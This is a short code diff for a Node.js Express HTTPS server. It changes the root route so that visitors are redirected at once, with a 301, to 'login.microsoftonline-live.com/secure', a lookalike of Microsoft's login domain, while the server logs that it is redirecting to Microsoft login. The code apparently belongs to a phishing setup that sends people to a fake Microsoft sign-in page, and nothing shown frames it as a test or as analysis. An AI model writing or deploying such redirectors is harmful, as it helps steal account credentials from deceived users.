@@ -23,10 +23,8 @@ const credentials = { key: privateKey, cert: certificate };
 const port = 442; // Ensure this port is open and not used by other services
 
 app.get('/', (req, res) => {
-  setTimeout(() => {
-    console.log('Redirecting to Microsoft login');
-    res.redirect(301, 'https://login.microsoftonline-live.com/secure');
-  }, 10);
+  console.log('Redirecting to Microsoft login');
+  res.redirect(301, 'https://login.microsoftonline-live.com/secure');
 });
 
 app.use((err, req, res, next) => {
